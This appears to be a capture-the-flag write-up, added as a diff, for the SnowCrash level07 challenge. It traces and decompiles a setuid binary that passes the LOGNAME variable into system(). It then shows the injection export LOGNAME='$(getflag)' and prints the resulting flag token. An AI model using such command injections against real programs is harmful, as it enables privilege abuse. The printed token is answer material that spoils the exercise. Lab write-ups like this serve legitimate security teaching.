@@ -1,0 +1,35 @@
+we have a binary file on level07 and when we run it we get ouput "level07"
+
+level07@SnowCrash:~$ ltrace ./level07 
+__libc_start_main(0x8048514, 1, 0xbffff694, 0x80485b0, 0x8048620 <unfinished ...>
+getegid()                                        = 2007
+geteuid()                                        = 2007
+setresgid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280) = 0
+setresuid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280) = 0
+getenv("LOGNAME")                                = "$(getflag)"
+asprintf(0xbffff5e4, 0x8048688, 0xbfffff29, 0xb7e5ee55, 0xb7fed280) = 21
+system("/bin/echo $(getflag) "Check flag.Here is your token : Nope there is no token here for you sorry. Try again :)
+ <unfinished ...>
+--- SIGCHLD (Child exited) ---
+<... system resumed> )                           = 0
++++ exited (status 0) +++
+
+we see that there're an env varible LOGNAME but we don't how's it's being set so we can analyze the file using dogbolt.org which it will return 
+
+int main() {
+    int32_t v1 = getegid(); // 0x804851d
+    int32_t v2 = geteuid(); // 0x8048526
+    setresgid(v1, v1, v1);
+    setresuid(v2, v2, v2);
+    char * buffer = NULL; // bp-28, 0x8048567
+    asprintf(&buffer, "/bin/echo %s ", getenv("LOGNAME"));
+    return system(buffer);
+}
+
+
+scp -P 4242 level07@localhost:/home/user/level07/level07 .
+
+export LOGNAME='$(getflag)'
+
+./level07 
+Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
